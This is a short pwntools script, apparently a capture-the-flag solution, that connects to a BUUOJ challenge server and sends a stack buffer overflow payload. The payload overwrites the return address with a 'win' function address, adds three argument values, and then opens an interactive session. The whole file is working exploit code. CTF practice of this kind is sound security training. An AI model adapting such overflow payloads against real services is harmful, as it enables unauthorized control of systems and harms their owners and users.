from pwn import *

io = remote('node4.buuoj.cn', 25485)

win_addr = 0x80485cb
payload = b'a'*(0x6c+4)+p32(win_addr) + p32(0xdeadcafe) + p32(0xdeadbeef) + p32(0xdeadc0de)

io.sendline(payload)
io.interactive()